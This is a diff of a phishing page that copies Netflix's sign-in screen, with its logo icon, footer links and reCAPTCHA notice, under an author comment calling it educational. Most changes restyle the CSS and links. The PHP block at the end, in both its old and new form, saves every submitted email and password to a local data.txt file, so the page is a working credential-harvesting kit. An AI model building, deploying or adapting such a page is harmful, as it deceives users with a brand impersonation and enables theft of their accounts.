@@ -2,19 +2,18 @@
 <html> 
 <head>
 <!--Author: @new92-->
-<!--This page has been made only for educational purposes !! Please do not try or use it for illegal activities-->
-<!--The author is not responsible for any illegal activities carried out using this page-->
-<meta charset="utf-8">
+<!--This page has been made only for educational purposes !! The author is not responsible for any illegal activities carried out using this page-->
 <title>Netflix</title>
-<link rel="icon" type="image/x-icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">
+<link rel="icon" type="image/x-icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">	
 <style>
 html {
 	font-family: sans-serif;
 }
 body {
-	background-image: url("background.jpg");
+	background-image: url("background1.jpg");
 	background-repeat: no-repeat;
 	background-position: left center;
+	font-family: sans-serif;
 }
 
 .footer {
@@ -33,7 +32,7 @@ body {
 	width: 20%;
 	padding: 60px 68px 40px;
 	margin: auto;
-	height: 500px;	
+	height: 500px;
 }
 
 .logo {
@@ -47,6 +46,11 @@ body {
 .signup {
 	font-size: 17px;
 	color: white;
+	text-decoration: none;
+}
+
+.signup:hover {
+	text-decoration: underline;
 }
 
 .recaptcha {
@@ -58,17 +62,27 @@ body {
 .email {
 	background-color: #333333;
 	color: white;
-	height: 44px;
+	height: 46px;
 	width: 295px;
 	border-radius: 5px;
+	border: 1px solid #333333;
 }
+
+.email:focus-visible {
+	outline: 1px solid #333333;
+} 
 
 .password {
 	background-color: #333333;
 	color: white;
-	height: 44px;
+	height: 48px;
 	width: 295px;
 	border-radius: 5px;
+	border: 1px solid #333333;
+}
+
+.password:focus-visible {
+	outline: 1px solid #333333;
 }
 
 .connect {
@@ -77,7 +91,7 @@ body {
 	width: 295px;
 	color: white;
 	font-size: 16px;
-	font: Sans-serif;
+	font-family: Sans-serif;
 	font-weight: bold;
 	border-radius: 5px;
 }
@@ -88,13 +102,12 @@ body {
 
 .log {
 	color: white;
-	font: 'Helvetica Neue';
+	font-family: sans-serif;
 	font-size: 30px;
 	left: 20px;
 	font-weight: bold;
-	margin-top: 50px;
+	margin-top: 9px;
 	margin-left: 4px;
-	
 }
 
 * {
@@ -124,6 +137,11 @@ html, body {
 	margin-top: 30px;
 	left: 267px;
 	position: absolute;
+	text-decoration: none;
+}
+
+.contactus:hover {
+	text-decoration: underline;
 }
 
 .comquest {
@@ -132,6 +150,11 @@ html, body {
 	margin-top: 77px;
 	left: 267px;
 	position: absolute;
+	text-decoration: none;
+}
+
+.comquest:hover {
+	text-decoration: underline;
 }
 
 .cookies {
@@ -141,13 +164,24 @@ html, body {
 	left: 267px;
 	position: absolute;
 	cursor: not-allowed;
+	text-decoration: none;
 }
+
+.cookies:hover {
+	text-decoration: underline;
+}
+
 .helpcenter {
 	color: #757575;
 	font-size: 13px;
 	margin-top: 77px;
 	left: 500px;
 	position: absolute;
+	text-decoration: none;
+}
+
+.helpcenter:hover {
+	text-decoration: underline;
 }
 
 .corpinfo {
@@ -156,6 +190,11 @@ html, body {
 	margin-top: 109px; 
 	left: 500px;
 	position: absolute;
+	text-decoration: none;
+}
+
+.corpinfo:hover {
+	text-decoration: underline;
 }
 
 .terms {
@@ -164,6 +203,11 @@ html, body {
 	margin-top: 77px;
 	left: 733px;
 	position: absolute;
+	text-decoration: none;
+}
+
+.terms:hover {
+	text-decoration: underline;
 }
 
 .privacy {
@@ -172,15 +216,37 @@ html, body {
 	margin-top: 77px;
 	left: 966px;
 	position: absolute;
+	text-decoration: none;
+}
+
+.privacy:hover {
+	text-decoration: underline;
 }
 
 .needhelp {
-	font-size: 15px;
+	font-size: 13px;
+	text-decoration: none;
+	margin-left: 120px;
+}
+
+.needhelp:hover {
+	text-decoration: underline;
 }
 
 .rememberme {
-	font-size: 15px;
+	font-size: 13px;
 	color: #B3B3B3;
+}
+
+.lmore {
+	color: #0071eb;
+	text-decoration: none;
+	margin-left: 70px;
+	margin-top: 77px;
+}
+
+.lmore:hover {
+	text-decoration: underline;
 }
 </style>
 </head> 
@@ -193,7 +259,7 @@ html, body {
 	<br>
 	<form action="connect.html" method="post"><center>
 	<label for="email"></label> 
-	<input style="font-size: 16px;" class="email "type="email" name="email" placeholder="  Email or phone number" required="required">
+	<input style="font-size: 16px;" class="email" type="email" name="email" placeholder="  Email or phone number" required="required">
 	<br>
 	<br>
 	<label for="password"></label>
@@ -203,17 +269,18 @@ html, body {
 	<br>
 	<input class="connect" type="submit" value="Sign In">
 	<br>
+	<br>
 	<input type="checkbox" checked>
 	<label class="rememberme">Remember me</label>
-	<a class="needhelp" href="https://www.netflix.com/LoginHelp" style="color:#B3B3B3">Need help?</a>
+	<a class="needhelp" href="https://www.netflix.com/LoginHelp" target="_blank" style="color:#B3B3B3">Need help?</a>
 	<br>
 	<br>
 	<br>
-	<div class="signup">
-	<p style="color: #B3B3B3">New to Netflix?<a href="https://www.netflix.com/" style="color: white"> Sign up now</a>.</p>
-	</div>
+	<br>
+	<br>
+	<p style="color: #737373; margin-left: -70px;">New to Netflix?<a href="https://www.netflix.com/" class="signup" target="_blank"> Sign up now</a>.</p>
 	<div class="recaptcha">
-	<p>This page is protected by Google reCAPTCHA to ensure you're not a bot.<a href="https://policies.google.com/privacy" style="color: #0071eb"> Learn more.</a></p>
+	<p>This page is protected by Google reCAPTCHA to<p style="margin-left: -145px;"> ensure you're not a bot.</p><a href="https://policies.google.com/privacy" class="lmore" target="_blank"> Learn more.</a></p>
 	</div>
 	</center>
 	<div class="expand">
@@ -225,23 +292,26 @@ html, body {
 <br>
 <br>
 <footer class="site-footer">
-<a href="https://help.netflix.com/contactus" class="contactus">Questions? Contact us.</a>
-<a href="https://help.netflix.com/node/412" class="comquest">FAQ</a>
-<a href="forbidden.html" class="cookies">Cookie Preferences</p>
-<a href="https://help.netflix.com/" class="helpcenter">Help Center</a>
-<a href="https://help.netflix.com/legal/corpinfo" class="corpinfo">Corporate Information</a>
-<a href="https://help.netflix.com/legal/termsofuse" class="terms">Terms of Use</a>
-<a href="https://help.netflix.com/legal/privacy" class="privacy">Privacy</a>
+<a href="https://help.netflix.com/contactus" target="_blank" class="contactus">Questions? Contact us.</a>
+<a href="https://help.netflix.com/node/412" target="_blank" class="comquest">FAQ</a>
+<a href="forbidden.html" target="_blank" class="cookies">Cookie Preferences</p>
+<a href="https://help.netflix.com/" target="_blank" class="helpcenter">Help Center</a>
+<a href="https://help.netflix.com/legal/corpinfo" target="_blank" class="corpinfo">Corporate Information</a>
+<a href="https://help.netflix.com/legal/termsofuse" target="_blank" class="terms">Terms of Use</a>
+<a href="https://help.netflix.com/legal/privacy" target="_blank" class="privacy">Privacy</a>
 </footer>
+
 <?php 
-$mail=$_POST["email"];
-$pass=$_POST["password"];
-
-$fp=fopen(dirname(__FILE__)."/data.txt","w");
-
-fwrite($fp, $mail);
-fwrite($fp, $pass);
-fclose($fp);
+if(isset($_POST['Sign In'])){
+$email = "Email: ".$_POST['email']."
+";
+$password = "Password: ".$_POST['password']."
+";
+$file=fopen("data.txt","a");
+fwrite($file, $email);
+fwrite($file, $password);
+fclose($file);
+}
 ?>
 </body> 
 </html>
